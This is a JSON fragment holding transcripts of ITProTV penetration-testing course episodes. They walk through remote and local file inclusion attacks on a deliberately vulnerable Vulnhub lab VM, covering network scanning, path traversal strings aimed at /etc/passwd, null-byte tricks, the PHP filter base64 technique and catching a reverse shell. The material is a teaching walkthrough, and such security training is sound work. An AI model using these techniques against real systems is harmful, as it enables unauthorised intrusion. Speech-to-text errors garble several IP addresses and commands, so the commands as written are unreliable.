you\nhave to work around from time to time.\n\n527\n00:29:29.340 --> 00:29:32.064\nAnd I figured out what our problem was,\nyou just take a look at my screen,\n\n528\n00:29:32.064 --> 00:29:32.879\nwe do have shell now.\n\n529\n00:29:32.879 --> 00:29:35.400\nAnd you're like I didn't get to see it.\n\n530\n00:29:35.400 --> 00:29:37.200\nWe'll show it to you again, no problem.\n\n531\n00:29:37.200 --> 00:29:41.090\nBut what happened was as I\nran my simple HTTP server\n\n532\n00:29:42.310 --> 00:29:45.810\nin the root where I copied my PHP shell,\nright.\n\n533\n00:29:45.810 --> 00:29:50.030\nSo I put that in that mail net\ndirectory and then started the server.\n\n534\n00:29:50.030 --> 00:29:52.780\nBut for whatever reason,\nit did not like that file.\n\n535\n00:29:52.780 --> 00:29:56.530\nEven though it was there, all the code\nwas right, it was not serving it up.\n\n536\n00:29:56.530 --> 00:29:57.300\nI don't know why.\n\n537\n00:29:57.300 --> 00:29:59.180\nI've done this a million times.\n\n538\n00:29:59.180 --> 00:30:01.040\nNo good reason I can think of.\n\n539\n00:30:01.040 --> 00:30:03.952\nMy head while should observe that file up,\nbut it didn't, so\n\n540\n00:30:03.952 --> 00:30:07.338\nwhat I did was I change directories\nto where I copied the PHP file from.\n\n541\n00:30:07.338 --> 00:30:09.800\nAnd then re-ran the same exact thing.\n\n542\n00:30:09.800 --> 00:30:12.740\nSo I just started the server there and\n\n543\n00:30:12.740 --> 00:30:15.270\nthen notice down here in our listener,\nwe do have a shell.\n\n544\n00:30:15.270 --> 00:30:17.390\nI'll exit out just so you can see that.\n\n545\n00:30:17.390 --> 00:30:19.110\nAgain, I'm in the wrong prompt.\n\n546\n00:30:19.110 --> 00:30:20.760\nExit, here you go.\n\n547\n00:30:20.760 --> 00:30:25.430\nAnd we'll start tamper data,\nice weasel and you know what else?\n\n548\n00:30:25.430 --> 00:30:28.120\nWe got a nice lovely error\nmessage from doing it, but\n\n549\n00:30:28.120 --> 00:30:32.920\nI just click main cuz I can go to that\ncontent.php, hit tamper yet again.\n\n550\n00:30:32.920 --> 00:30:37.552\nIt was absolutely no different other than\nI changed directories where my web server\n\n551\n00:30:37.552 --> 00:30:39.349\nwas gonna start and that was it.\n\n552\n00:30:39.349 --> 00:30:47.173\nAnd here I did\nhttp://192.16.8.219.146:8888,\n\n553\n00:30:47.173 --> 00:30:52.620\nthat's where that's running and\nthen php.shell.\n\n554\n00:30:52.620 --> 00:30:56.210\nAnd if I fire up my listener yet again.\n\n555\n00:30:57.980 --> 00:30:59.950\nHopefully that goes off,\nI might have missed it.\n\n556\n00:30:59.950 --> 00:31:04.770\nI have to do it one more time, cuz I've\nalready missed my window of opportunity.\n\n557\n00:31:04.770 --> 00:31:06.909\nOne more time, for good measure,\ncuz I want these good people to see it.\n\n558\n00:31:13.931 --> 00:31:14.721\n&gt;&gt; Drum roll please.\n\n559\n00:31:14.721 --> 00:31:15.271\n&gt;&gt; Yeah.\n\n560\n00:31:15.271 --> 00:31:20.587\n[LAUGH] There we go.\n\n561\n00:31:20.587 --> 00:31:23.470\nAnd there it is.\n\n562\n00:31:23.470 --> 00:31:26.470\nNow, you've seen it from start to\nfinish and it was just something up\n\n563\n00:31:26.470 --> 00:31:29.650\nwith that copied file that didn't\nlike it and wasn't showing up.\n\n564\n00:31:29.650 --> 00:31:31.200\nBut change directories,\n\n565\n00:31:31.200 --> 00:31:35.590\nwent into the normal web roots,\nstarted my server, everything went gravy.\n\n566\n00:31:35.590 --> 00:31:36.210\nNow we got shell.\n\n567\n00:31:36.210 --> 00:31:41.000\nFrom here, I can do a who am I and\nit shows that I'm\n\n568\n00:31:41.000 --> 00:31:45.890\nlogged in as www- data which is typically\nthe web server service accounts and\n\n569\n00:31:45.890 --> 00:31:48.540\nI'll have to elevate my\nprivileges from here.\n\n570\n00:31:48.540 --> 00:31:52.880\nBut we were able to get a shell\nwith limited abilities.\n\n571\n00:31:52.880 --> 00:31:54.910\nAnd we can continue hacking on from there.\n\n572\n00:31:54.910 --> 00:31:56.660\n&gt;&gt; Absolutely,\nthat's your foot in the door.\n\n573\n00:31:56.660 --> 00:31:58.550\nAnd the as a hacker or pen tester,\n\n574\n00:31:58.550 --> 00:32:01.930\nour next phase is to escalate privileges,\nright.\n\n575\n00:32:01.930 --> 00:32:03.390\nSo we've got we're in,\n\n576\n00:32:03.390 --> 00:32:06.590\nnow we just gotta figure out how\nwe can bump our privileges up.\n\n577\n00:32:06.590 --> 00:32:10.430\nSo that we can do more damage or\nget further in our penetration tests.\n\n578\n00:32:10.430 --> 00:32:12.880\n&gt;&gt; Good news, Mike, is we're gonna\ndo a show on privilege escalation.\n\n579\n00:32:12.880 --> 00:32:13.410\nSo, [LAUGH]\n&gt;&gt; [LAUGH]\n\n580\n00:32:13.410 --> 00:32:14.186\n&gt;&gt; That will help.\n\n581\n00:32:14.186 --> 00:32:16.220\n&gt;&gt; All right, Daniel, great stuff there.\n\n582\n00:32:16.220 --> 00:32:22.340\nReally in-depth look at how we\ncan perform an RFI remote file,\n\n583\n00:32:22.340 --> 00:32:24.930\ninclude another one of\nthose web app attacks.\n\n584\n00:32:24.930 --> 00:32:25.540\nSo we thank you for\n\n585\n00:32:25.540 --> 00:32:28.780\nthat, we hope everybody out\nthere enjoyed watching this one.\n\n586\n00:32:28.780 --> 00:32:31.870\nSigning off for ITProTV,\nI have been your host Mike Rodrick.\n\n587\n00:32:31.870 --> 00:32:32.640\n&gt;&gt; And I'm Daniel Lowrie.\n\n588\n00:32:32.640 --> 00:32:33.797\n&gt;&gt; And we'll see you next time.\n\n589\n00:32:33.797 --> 00:32:41.588\n[MUSIC]\n\n590\n00:32:41.588 --> 00:32:43.589\n&gt;&gt; Thank you for watching ITProTV.\n\n",
          "vimeoId": "202379059"
        },
        {
          "description": "In this episode, Dan and Mike look at local file inclusion. They demonstrate how to determine if a site is vulnerable to LFI.  Then they use LFI to obtain a reverse shell on a target machine.",
          "length": "1931",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-5-3-web_apps_local_file_inclusion-020117-PGM.00_31_57_18.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-5-3-web_apps_local_file_inclusion-020117-PGM.00_31_57_18.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-5-3-web_apps_local_file_inclusion-020117-PGM.00_31_57_18.Still001-sm.jpg",
          "title": "Web Apps Local File Inclusion (LFI)",
          "transcript": "WEBVTT\n\n1\n00:00:00.095 --> 00:00:02.148\nWelcome to ITProTV I'm your host,\nDon Pizzet.\n\n2\n00:00:02.148 --> 00:00:04.235\n[CROSSTALK]\n\n3\n00:00:04.235 --> 00:00:08.319\n[MUSIC]\n\n4\n00:00:08.319 --> 00:00:10.445\n&gt;&gt; You're watching ITProTV.\n\n5\n00:00:10.445 --> 00:00:15.650\n&gt;&gt; Hello, welcome to another\nexciting episode here on ITProTV.\n\n6\n00:00:15.650 --> 00:00:17.430\nI'm your host Mike Rodrick.\n\n7\n00:00:17.430 --> 00:00:19.200\nToday we're doing Penetration Testing.\n\n8\n00:00:19.200 --> 00:00:24.270\nAnd in this episode we're gonna be\nfocusing in on local file inclusion\n\n9\n00:00:24.270 --> 00:00:29.000\nis another one of those web app-based\nattack we've already taken a look at,\n\n10\n00:00:29.000 --> 00:00:30.700\nremote file inclusion?\n\n11\n00:00:30.700 --> 00:00:32.700\nNow we're gonna look at\nlocal file inclusion,\n\n12\n00:00:32.700 --> 00:00:35.900\nhere to explain it to us what it is,\nthe difference and how it works.\n\n13\n00:00:35.900 --> 00:00:39.080\nIs our security expert, Mr. Daniel Lowry.\n\n14\n00:00:39.080 --> 00:00:39.932\nWelcome Daniel.\n\n15\n00:00:39.932 --> 00:00:41.090\n&gt;&gt; Thanks Mike.\nSecurity expert.\n\n16\n00:00:41.090 --> 00:00:43.575\nI like that, sound of that.\n\n17\n00:00:43.575 --> 00:00:45.730\n&gt;&gt; [LAUGH].\n&gt;&gt; Even though it's not true.\n\n18\n00:00:45.730 --> 00:00:47.560\nI know a little something about something,\nright.\n\n19\n00:00:47.560 --> 00:00:50.800\nThat's why we're doing this here,\nlittle series that we've been working on.\n\n20\n00:00:50.800 --> 00:00:53.980\nAnd today, like Mike said, we're gonna\ntake a look at local file inclusion.\n\n21\n00:00:53.980 --> 00:00:56.000\nIf you watched remote file inclusion,\n\n22\n00:00:56.000 --> 00:00:59.880\nyou're gonna be like I kind of think\nI know where you're going with this.\n\n23\n00:00:59.880 --> 00:01:03.060\nIf you didn't, well let me tell you\nwhat a local file inclusion is.\n\n24\n00:01:03.060 --> 00:01:08.920\nIt's basically the ability to use a file\nthat is local to the target machine,\n\n25\n00:01:08.920 --> 00:01:11.530\nas part of an attack, per say.\n\n26\n00:01:11.530 --> 00:01:15.530\nSo if I can upload a file that says,\nhey, reach out and\n\n27\n00:01:15.530 --> 00:01:20.410\nshovel shell to this IP address at\nthis port then it will do that.\n\n28\n00:01:20.410 --> 00:01:22.840\nSo that's what we basically are gonna,\nwant to do.\n\n29\n00:01:22.840 --> 00:01:27.140\nWe want to create an exploit\nthat will include a file that is\n\n30\n00:01:27.140 --> 00:01:31.220\non the system already and\nwhich is malicious code.\n\n31\n00:01:31.220 --> 00:01:36.968\nAnd then execute that malicious code,\ncreating a shell, and that's basically it.\n\n32\n00:01:36.968 --> 00:01:39.550\nSo let's talk about how that works,\nwe saw remove file inclusion and\n\n33\n00:01:39.550 --> 00:01:43.190\nit was basically saying, hey,\nat this URL look for this file.\n\n34\n00:01:43.190 --> 00:01:46.939\nWell inside of a file system we don't\nget to use a URL is right they're,\n\n35\n00:01:46.939 --> 00:01:48.800\nthere local to the system.\n\n36\n00:01:48.800 --> 00:01:52.470\nSo we're gonna try to finagle\nusing directory commands and\n\n37\n00:01:52.470 --> 00:01:56.000\nthings of that nature to try to get it\nto find the file we're looking for and\n\n38\n00:01:56.000 --> 00:01:57.990\ntest to see if that's even possible.\n\n39\n00:01:57.990 --> 00:01:59.930\nBecause, hey, you gotta test to see.\n\n40\n00:01:59.930 --> 00:02:02.040\nYou can't just go, hey,\nremote file inclusions and\n\n41\n00:02:02.040 --> 00:02:03.990\nlocal file inclusions are awesome.\n\n42\n00:02:03.990 --> 00:02:05.130\nI'm going to do it.\n\n43\n00:02:05.130 --> 00:02:08.200\nIf it's not vulnerable to it, then you're\nnot gonna be able to pull this off.\n\n44\n00:02:08.200 --> 00:02:09.440\nSo we have to scan for that.\n\n45\n00:02:09.440 --> 00:02:12.720\n&gt;&gt; Now Daniel, we are looking for a file\nthat might already exist on this server,\n\n46\n00:02:12.720 --> 00:02:15.870\nor are we gonna upload this file, and\nthen try to get it to serve it up.\n\n47\n00:02:15.870 --> 00:02:18.710\n&gt;&gt; Yeah.\nTypically we're going to upload a file\n\n48\n00:02:18.710 --> 00:02:23.970\ninto the system, and then use it as a\nlocal file because it's not allowing us to\n\n49\n00:02:23.970 --> 00:02:27.940\ndo remote file inclusion, so remote file\ninclusions are a whole lot easier because\n\n50\n00:02:27.940 --> 00:02:32.480\nhere, I make the file, it's on my machine,\npoint to it and off to the races, right.\n\n51\n00:02:32.480 --> 00:02:36.350\nHere, we need to actually get\nthat file uploaded somehow.\n\n52\n00:02:36.350 --> 00:02:38.470\nAnd that is where the difficulty lies,\nright.\n\n53\n00:02:38.470 --> 00:02:41.040\nIs how do we get that\nfile onto the system.\n\n54\n00:02:41.040 --> 00:02:43.040\nWe gotta look for some ways,\n\n55\n00:02:43.040 --> 00:02:45.770\ntypically this is through\nan include statement, right?\n\n56\n00:02:45.770 --> 00:02:48.750\nWe talked about including statements\nbefore how they allow them to include\n\n57\n00:02:48.750 --> 00:02:50.140\nfiles on the system.\n\n58\n00:02:50.140 --> 00:02:56.040\nWell if they include a file and\nallow us to change what file that is,\n\n59\n00:02:56.040 --> 00:02:59.840\nwell then we use that and then if there's\nany way for us to upload to the system\n\n60\n00:02:59.840 --> 00:03:05.540\nmaybe the I don't know, maybe there's\nan upload system in place, comment boxes,\n\n61\n00:03:05.540 --> 00:03:10.250\nsomewhere where I can put data onto that\nmachine and then know where that file is.\n\n62\n00:03:10.250 --> 00:03:12.380\nIf I know where that file is,\nI can point to it and\n\n63\n00:03:12.380 --> 00:03:17.300\nsay use that file access logs for\nApache, great way to put it.\n\n64\n00:03:17.300 --> 00:03:21.480\nJust log in, write your code, and put it,\nand now it becomes part of the log.\n\n65\n00:03:21.480 --> 00:03:25.990\nIf I know where that log resides,\nwell then I can use that as my local file.\n\n66\n00:03:25.990 --> 00:03:29.940\nIf I'm able to actually traverse\nthe system and find that.\n\n67\n00:03:29.940 --> 00:03:31.550\nThat's what we're gonna do today.\n\n68\n00:03:31.550 --> 00:03:34.360\nFirst thing we do as always\nremember end map scans so\n\n69\n00:03:34.360 --> 00:03:36.580\nthat we can see what our machines are.\n\n70\n00:03:36.580 --> 00:03:38.970\nLet's find the IP address,\nall that other good stuff.\n\n71\n00:03:38.970 --> 00:03:42.270\nLet's do the Net Discover and\nthen we'll run Nmap, and see what happens.\n\n72\n00:03:42.270 --> 00:03:47.495\nSo Net Discover, Disk cover,\nwow, I'm just so bad at this.\n\n73\n00:03:47.495 --> 00:03:48.216\n&gt;&gt; [LAUGH].\n\n74\n00:03:48.216 --> 00:03:54.859\n&gt;&gt; Let's discovered- I -r for\narrange 168.209.1 and\n\n75\n00:03:54.859 --> 00:04:01.616\nthen forget a period there, [CROSSTALK]\nI want a little backward action.\n\n76\n00:04:01.616 --> 00:04:05.214\nI love that Mike is my third eye.\n\n77\n00:04:05.214 --> 00:04:06.436\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n78\n00:04:06.436 --> 00:04:08.347\n&gt;&gt; I can't, I'm looking at my computer,\n\n79\n00:04:08.347 --> 00:04:09.650\nnot my screen here.\n\n80\n00:04:09.650 --> 00:04:12.270\nAnd then of course, 24,\n4, my IP address range.\n\n81\n00:04:12.270 --> 00:04:16.070\nAll right, let's see, give me the bacon.\n\n82\n00:04:16.070 --> 00:04:16.910\nThere it is 145.\n\n83\n00:04:16.910 --> 00:04:21.380\nNow I know that's there, Ctrl+C that.\n\n84\n00:04:21.380 --> 00:04:28.518\nOn my in maps scanning-a-t4\nevery port in the system and\n\n85\n00:04:28.518 --> 00:04:35.690\nwe will do that on 168.319.145 they said.\n\n86\n00:04:35.690 --> 00:04:38.780\nYeah, 145.\nThere we go.\n\n87\n00:04:38.780 --> 00:04:42.000\nLet's see what comes up,\ncome on, come on, come on.\n\n88\n00:04:42.000 --> 00:04:45.660\nWe got all day there Nmap, even though\nit runs super fast, let's be honest.\n\n89\n00:04:45.660 --> 00:04:46.660\n&gt;&gt; [LAUGH].\n&gt;&gt; It's really not that long.\n\n90\n00:04:46.660 --> 00:04:49.350\nI think the last scan ran like\nseven seconds or something.\n\n91\n00:04:49.350 --> 00:04:51.970\n&gt;&gt; Yeah, the dash A is running\nthrough a few different scripts.\n\n92\n00:04:51.970 --> 00:04:54.110\n&gt;&gt; Yeah, it's not slouching at all.\n\n93\n00:04:54.110 --> 00:04:57.080\nAnd there's some look at that, 16 seconds.\n\n94\n00:04:57.080 --> 00:04:58.385\nThe wait was horrible.\n\n95\n00:04:58.385 --> 00:05:00.480\n&gt;&gt; [LAUGH]\n&gt;&gt; We're just impatient people.\n\n96\n00:05:00.480 --> 00:05:02.882\nI always say, if you want patience,\nbecome a doctor, right?\n\n97\n00:05:02.882 --> 00:05:06.820\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] So we're looking through here,\n\n98\n00:05:06.820 --> 00:05:08.870\nwe see the, that's an interesting thing.\n\n99\n00:05:08.870 --> 00:05:13.650\nWe've got a port open for\nMySQL remote access, like that.\n\n100\n00:05:15.000 --> 00:05:16.300\nPort 80 is open.\n\n101\n00:05:16.300 --> 00:05:18.440\nNo SSH, it's interesting, right?\n\n102\n00:05:18.440 --> 00:05:20.430\nSo I'm not gonna be able to\nuse that as an attack vector.\n\n103\n00:05:20.430 --> 00:05:25.020\nBut 80 is running into serving on\nApache and is a Debian system,\n\n104\n00:05:25.020 --> 00:05:27.380\nand there's the name.\n\n105\n00:05:27.380 --> 00:05:31.360\nYes, lest I forget, where did I get\nthis wonderful VM that we're attacking?\n\n106\n00:05:31.360 --> 00:05:34.840\nWell our good friends at Vulnhub.com have\n\n107\n00:05:34.840 --> 00:05:38.380\nan allowance to use their\nsystem demonstration purposes.\n\n108\n00:05:38.380 --> 00:05:41.250\nSo run after the Vulnhub.com.\n\n109\n00:05:41.250 --> 00:05:46.150\nGrab this particular VMS\nit's called pawn lab.\n\n110\n00:05:46.150 --> 00:05:48.390\nThere's the acronym pawn lab eight in one.\n\n111\n00:05:48.390 --> 00:05:51.985\nSo if you just search your internet for\npawn lab, you will be able to find this\n\n112\n00:05:51.985 --> 00:05:56.830\nVMS downloaded and run it in your virtual\nenvironment, and your virtual box.\n\n113\n00:05:56.830 --> 00:06:01.300\nVMware player, VMware fusion, HyperV\nwhatever you're running, go for it, go for\n\n114\n00:06:01.300 --> 00:06:02.650\nbroken and get that guy up and running.\n\n115\n00:06:02.650 --> 00:06:04.710\nAnd remember always SandBox,\n\n116\n00:06:04.710 --> 00:06:08.260\nno internet access when it comes to\nthese things cuz they're vulnerable and\n\n117\n00:06:08.260 --> 00:06:11.148\nyou don't wanna put that heard up for\nthe world for yourself, right.\n\n118\n00:06:11.148 --> 00:06:11.884\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n119\n00:06:11.884 --> 00:06:16.640\nkeep out of that and\ndefinitely sandbox your stuff, okay.\n\n120\n00:06:16.640 --> 00:06:18.110\nSo now, we know portal is open.\n\n121\n00:06:18.110 --> 00:06:19.270\nMy SQL is open.\n\n122\n00:06:19.270 --> 00:06:23.000\nWe're probably working with some sort\nof web front end with the database in\n\n123\n00:06:23.000 --> 00:06:23.770\nthe back end, right?\n\n124\n00:06:23.770 --> 00:06:26.040\nSo that's might be where we're looking at.\n\n125\n00:06:26.040 --> 00:06:29.250\nSo from here, what I'm gonna do,\nyou know what?\n\n126\n00:06:29.250 --> 00:06:30.778\nI'm just gonna go straight for the kill.\n\n127\n00:06:30.778 --> 00:06:36.220\n[COUGH] Excuse me, I'll open up my\nbrowser, let's just look at the website.\n\n128\n00:06:36.220 --> 00:06:38.463\nIt really gives you a lot of information.\n\n129\n00:06:38.463 --> 00:06:42.130\nSo 192.168.219.145.\n\n130\n00:06:42.130 --> 00:06:47.110\nAnd another very simple\nstraightforward web page,\n\n131\n00:06:47.110 --> 00:06:51.180\ngot a couple of links here home,\nlog in and upload.\n\n132\n00:06:51.180 --> 00:06:55.330\nUpload that's definitely something\nthat has perked my interest.\n\n133\n00:06:55.330 --> 00:06:59.160\nIf we click home,\ntakes us here really special.\n\n134\n00:06:59.160 --> 00:07:02.120\nLogin I am if,\nI can't hover with my mouse obviously but\n\n135\n00:07:02.120 --> 00:07:04.210\nin the bottom left hand\ncorner of my screen.\n\n136\n00:07:04.210 --> 00:07:07.190\nActually watch this\n[LAUGH] right around here,\n\n137\n00:07:07.190 --> 00:07:11.150\nyou'll see that it's actually\nshowing me what page we're going to,\n\n138\n00:07:11.150 --> 00:07:18.140\nthat's good information, and then upload\nand so if I click home nothing logged in.\n\n139\n00:07:18.140 --> 00:07:21.890\nTypically, username-password type\nlog in prompt and then upload.\n\n140\n00:07:21.890 --> 00:07:24.220\nIt says, you must be log in.\n\n141\n00:07:24.220 --> 00:07:25.220\nIt must be logged in.\n\n142\n00:07:25.220 --> 00:07:27.110\n[LAUGH] But what can you say,\n\n143\n00:07:27.110 --> 00:07:30.170\nI'm not gonna despair these people for\ntheir bad grammar on this.\n\n144\n00:07:30.170 --> 00:07:31.210\nCuz they're allowing us to use it.\n\n145\n00:07:31.210 --> 00:07:32.645\nSo thank you so much.\n\n146\n00:07:32.645 --> 00:07:33.230\n&gt;&gt; [LAUGH]\n&gt;&gt; All right.\n\n147\n00:07:33.230 --> 00:07:35.000\nSo where do we begin?\n\n148\n00:07:35.000 --> 00:07:40.618\nWe do like to look at code,\nlet's see here.\n\n149\n00:07:40.618 --> 00:07:43.286\nLet's take a look if I go to login,\n\n150\n00:07:43.286 --> 00:07:48.254\nif you up here in the browser address\narea the URL area you see this\n\n151\n00:07:48.254 --> 00:07:53.409\npage=login that is something that\nyou want to keep an eye out for.\n\n152\n00:07:53.409 --> 00:08:00.036\nThis is an indication that an RFI might,\nI'm sorry, LFI might be possible.\n\n153\n00:08:00.036 --> 00:08:04.370\nOkay, because it's saying\nthis page equals log in.\n\n154\n00:08:04.370 --> 00:08:09.520\nSo there's a page called log in and\nit's including that into the link.\n\n155\n00:08:09.520 --> 00:08:13.830\nSo when I click the link, it looks for\nthat page and then delivers it instead of\n\n156\n00:08:13.830 --> 00:08:18.900\nobfuscating that or sanitizing that\nsomehow or doing it a different way,\n\n157\n00:08:18.900 --> 00:08:21.140\nthey just straight up put it and\nyou'll see this a lot.\n\n158\n00:08:21.140 --> 00:08:24.880\nSo I'm not definitely,\nI've got an upload page.\n\n159\n00:08:24.880 --> 00:08:26.460\nMan, there's some prime attack.\n\n160\n00:08:26.460 --> 00:08:28.405\nObviously we're doing it,\nit is vulnerable.\n\n161\n00:08:28.405 --> 00:08:33.010\n[LAUGH] Otherwise it's gonna be a boring\nshow, of us not getting anywhere, right?\n\n162\n00:08:33.010 --> 00:08:37.800\nBut that is definitely something\nyou wanna raise an eyebrow to for\n\n163\n00:08:37.800 --> 00:08:43.620\nan LFI type of attack,\nthat that page equals something is there.\n\n164\n00:08:44.810 --> 00:08:51.040\nSo let's see here, let's try some\ngood old fashioned LFIs and that\n\n165\n00:08:51.040 --> 00:08:55.710\nyou can just type into the URL and you can\nsee if you can get any kind of results.\n\n166\n00:08:55.710 --> 00:08:59.300\nSo what you can do is you can say\ninstead of page equals login,\n\n167\n00:08:59.300 --> 00:09:04.540\nI'm gonna say page=../../../../../../../,\njust adding enough ../'s\n\n168\n00:09:04.540 --> 00:09:09.470\nthat this is basically\na directory traversal maneuver.\n\n169\n00:09:09.470 --> 00:09:13.710\nI'm trying to back up out of\nthe directory to the root so\n\n170\n00:09:13.710 --> 00:09:18.070\nthat I can then move to the directory\ntoward out etsy password file.\n\n171\n00:09:18.070 --> 00:09:20.370\nCuz that's a file I know it exists, and\n\n172\n00:09:20.370 --> 00:09:25.276\nyou can at least read it maybe depending\nif this thing has the correct permissions.\n\n173\n00:09:25.276 --> 00:09:30.460\nSo let's do etsy/passwd.\n\n174\n00:09:30.460 --> 00:09:34.018\nLet's see if that gives\nus any kind of action.\n\n175\n00:09:34.018 --> 00:09:37.210\nNothing is happening, so\nI'm not saying they output the file\n\n176\n00:09:37.210 --> 00:09:41.520\nI'm not getting kinda errors, so it's\nsanitizing that data correctly, right?\n\n177\n00:09:41.520 --> 00:09:45.160\nSo even though that page\nequals login is there\n\n178\n00:09:45.160 --> 00:09:49.720\ngoing through the URL right here\nis not giving me any other ghost.\n\n179\n00:09:49.720 --> 00:09:54.100\nNow sometimes like we saw before maybe\nits adding something to the end of\n\n180\n00:09:54.100 --> 00:09:59.130\nthe URL string so we can kind of\nnegate that by doing a percent,\n\n181\n00:09:59.130 --> 00:10:01.400\nI think it's 20 like that.\n\n182\n00:10:01.400 --> 00:10:03.710\nAnd basically saying and\nwe're done, right?\n\n183\n00:10:03.710 --> 00:10:05.030\nNothing after this.\n\n184\n00:10:05.030 --> 00:10:07.300\nSo even if the website try\nto add something to it,\n\n185\n00:10:07.300 --> 00:10:08.650\nthat %20 will chop it off.\n\n186\n00:10:10.210 --> 00:10:11.335\nOr is the %00.\n\n187\n00:10:11.335 --> 00:10:12.300\nI think %00.\n\n188\n00:10:13.310 --> 00:10:15.030\nSo out of my mind here.\n\n189\n00:10:15.030 --> 00:10:16.900\n%00 so no bytes.\n\n190\n00:10:16.900 --> 00:10:18.470\nHere we go, but still nothing.\n\n191\n00:10:18.470 --> 00:10:20.411\nGot nothing with the 20,\ngot nothing with this.\n\n192\n00:10:20.411 --> 00:10:21.527\nThis is going nowhere far.\n\n193\n00:10:21.527 --> 00:10:27.548\nSo I know that at least through the URL\non this server I'm not getting anywhere.\n\n194\n00:10:27.548 --> 00:10:33.173\nIf I saw the etsy password\nfile displayed in the webpage.\n\n195\n00:10:33.173 --> 00:10:37.659\nAll right, I would say great, that means\nI'll go look for file inclusion and\n\n196\n00:10:37.659 --> 00:10:40.780\nI can use the web URL to attack this box.\n\n197\n00:10:40.780 --> 00:10:41.929\nWe're not so lucky here.\n\n198\n00:10:41.929 --> 00:10:45.577\nSo we're gonna have to continue\nmoving on and see where else,\n\n199\n00:10:45.577 --> 00:10:49.448\nmaybe something else will show\nitself as another attack factor.\n\n200\n00:10:49.448 --> 00:10:52.540\nAll right, let's see here,\nthat's not working.\n\n201\n00:10:52.540 --> 00:10:53.600\nLet's run netco.\n\n202\n00:10:53.600 --> 00:10:56.260\nNow that we've kinda kicked\nour feet around a little bit.\n\n203\n00:10:56.260 --> 00:11:00.410\nLet's see if gives us\nany good information.\n\n204\n00:11:00.410 --> 00:11:04.252\nWe'll just say nick to-h and\n\n205\n00:11:04.252 --> 00:11:10.101\nthis is 192.168.219.145.\n\n206\n00:11:10.101 --> 00:11:12.070\nFire that off.\n\n207\n00:11:12.070 --> 00:11:13.840\nLet that churn and burn.\n\n208\n00:11:13.840 --> 00:11:16.075\nI already am seeing something that I like.\n\n209\n00:11:16.075 --> 00:11:21.306\nContinue, continue, continue,\nlet me raise the subs so\n\n210\n00:11:21.306 --> 00:11:24.749\nwe can see this a little bit easier.\n\n211\n00:11:24.749 --> 00:11:26.402\nI'm just seeing good stuff here.\n\n212\n00:11:26.402 --> 00:11:28.633\nSo, yeah, yeah.\n\n213\n00:11:28.633 --> 00:11:31.281\nOne thing that I'm seeing that\nI'm already a big fan of and\n\n214\n00:11:31.281 --> 00:11:34.450\nI kinda halted on there so\nhopefully you saw it as well.\n\n215\n00:11:34.450 --> 00:11:39.860\nWas right here, /.config.php.\n\n216\n00:11:39.860 --> 00:11:43.950\nPhp config file may contain\ndatabase ID's and passwords.\n\n217\n00:11:43.950 --> 00:11:46.540\nMm, well, hey there.\n\n218\n00:11:46.540 --> 00:11:47.370\n&gt;&gt; Isn't that special.\n\n219\n00:11:47.370 --> 00:11:48.140\n&gt;&gt; How's it going?\n\n220\n00:11:48.140 --> 00:11:50.230\nRight, I'm down with that.\n\n221\n00:11:50.230 --> 00:11:52.231\nSo config.php.\n\n222\n00:11:52.231 --> 00:11:56.260\nSo let's see, let's browse to that and\nlet's see what will happen here.\n\n223\n00:11:56.260 --> 00:11:58.460\nLet me bring that back down just a bit.\n\n224\n00:11:58.460 --> 00:12:01.460\nThere we go.\n\n225\n00:12:03.590 --> 00:12:10.740\nLet's go to config.php,\nyou should take that out, config.php.\n\n226\n00:12:10.740 --> 00:12:12.710\nWow, that's exciting.\n\n227\n00:12:12.710 --> 00:12:14.540\nHold on and nothing going on there.\n\n228\n00:12:14.540 --> 00:12:17.110\nWell, obviously,\nthere's nothing displayed on the page.\n\n229\n00:12:17.110 --> 00:12:18.370\nMaybe it's in the source code, right?\n\n230\n00:12:18.370 --> 00:12:19.252\nLet's look at the source.\n\n231\n00:12:19.252 --> 00:12:22.360\nRight-click &gt; View Page Source.\n\n232\n00:12:24.060 --> 00:12:27.900\nThere's absolutely nothing in the page\nsource, so that's interesting.\n\n233\n00:12:27.900 --> 00:12:33.380\nAnd as I worked with this, I realized\nthere's a page there, it has code.\n\n234\n00:12:34.710 --> 00:12:36.540\nWhy is there nothing showing up?\n\n235\n00:12:36.540 --> 00:12:38.592\nEither there's just an empty file but\n\n236\n00:12:38.592 --> 00:12:43.430\nnet go was lending that there might be\ndatabase usernames or passwords there.\n\n237\n00:12:43.430 --> 00:12:48.210\nSo I did a little searching around and\nrealized that I found a cool technique to\n\n238\n00:12:48.210 --> 00:12:52.940\nlook for data that might be\nobfuscated by the web developers\n\n239\n00:12:52.940 --> 00:12:58.250\nthemselves where we actually\nencode the data first in base 64.\n\n240\n00:12:58.250 --> 00:13:03.190\nAnd then drop it like it's hot and see\nwhat's inside of it and you can tend to\n\n241\n00:13:03.190 --> 00:13:07.580\nfind a whole lot of interesting stuff\nthat they might have hidden from you.\n\n242\n00:13:07.580 --> 00:13:08.772\nSo it's a very cool technique.\n\n243\n00:13:08.772 --> 00:13:11.050\nI'm gonna show you how\nto do this right now.\n\n244\n00:13:11.050 --> 00:13:15.570\nIt's called PHP filter, we're going to use\na filter to run it through base 64 and\n\n245\n00:13:15.570 --> 00:13:19.640\nsee what comes out on\nthe end of the pipe there.\n\n246\n00:13:19.640 --> 00:13:23.180\nThere were a couple of other\nweb directories we saw.\n\n247\n00:13:23.180 --> 00:13:24.890\nWe saw index, we saw home.\n\n248\n00:13:24.890 --> 00:13:28.830\nWe definitely want to do this for all of\nthem because if they're doing it on one.\n\n249\n00:13:28.830 --> 00:13:31.080\nChances are they might be\ndoing it on all of them.\n\n250\n00:13:31.080 --> 00:13:35.930\nSo, wanna be thorough, that is the key to\nthis game, ladies and gentlemen, is that\n\n251\n00:13:35.930 --> 00:13:40.540\nyou look everywhere you leave no stone\nunturned because I guarantee the one thing\n\n252\n00:13:40.540 --> 00:13:46.060\nyou went, yeah, just kinda skimmed through\nthat, that's where the vulnerability lied.\n\n253\n00:13:46.060 --> 00:13:48.740\nAnd you didn't get to explore\nthe machine cuz you looked over it.\n\n254\n00:13:48.740 --> 00:13:51.270\nSo make sure you look\neverywhere you possibly can.\n\n255\n00:13:52.390 --> 00:13:53.660\nSo I'm 